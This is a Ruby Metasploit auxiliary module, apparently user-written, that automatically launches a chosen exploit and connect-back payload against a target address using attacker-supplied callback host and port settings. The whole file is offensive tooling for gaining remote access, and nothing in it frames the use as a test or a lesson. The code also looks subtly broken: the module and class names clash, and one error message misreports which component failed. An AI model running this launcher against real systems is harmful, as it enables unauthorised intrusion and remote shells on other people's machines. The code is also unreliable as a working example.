require 'msf/core'

module Msf
	module Auxiliary
		class AutomatedExploitLauncher < Msf::Auxiliary
			def initialize
				super(
					'Name' => 'Automated Exploit Launcher',
					'Description' => 'Automatically launches a specified exploit and payload against a target system.',
					'Author' => ['KillianBHV'],
					'License' => MSF_LICENSE
				)

				register_options(
					[
						Opt::RHOST(),
						OptString.new('EXPLOIT', [true, 'Name of the exploit module']),
						OptString.new('PAYLOAD', [true, 'Name of the payload']),
						OptString.new('LHOST', [true, 'Local IP for the payload']),
						OptInt.new('LPORT', [true, 'Local port for the payload', 4444])
					]
				)
			end

			def run
				target_ip = datastore['RHOST']
				exploit_name = datastore['EXPLOIT']
				payload_name = datastore['PAYLOAD']
				lhost = datastore['LHOST']
				lport = datastore['LPORT']

				print_status("Launch exploit #{exploit_name} against #{target_ip} with payload #{payload_name}")

				begin
					exploit = framework.exploits.create(exploit_name)
					if exploit.nil?
						print_error("The payload could not be loaded: #{exploit_name}")
						return
					end

					exploit.datastore['RHOST'] = target_ip
					
                                        payload = framework.payloads.create(payload_name)
					if payload.nil?
						print_error("The payload could not be loaded: #{payload_name}")
						return
					end

					payload.datastore['LHOST'] = lhost
					payload.datastore['LPORT'] = lport

					exploit.datastore['PAYLOAD'] = payload.name
					print_status("Payload execution...")
					exploit.exploit_simple(
						'Payload' => payload,
						'LocalInput' => framework.input,
						'LocalOutput' => framework.output
					)
				rescue => e
					print_error("Error during the execution: #{e.message}")
				end
			end
		end
	end
end
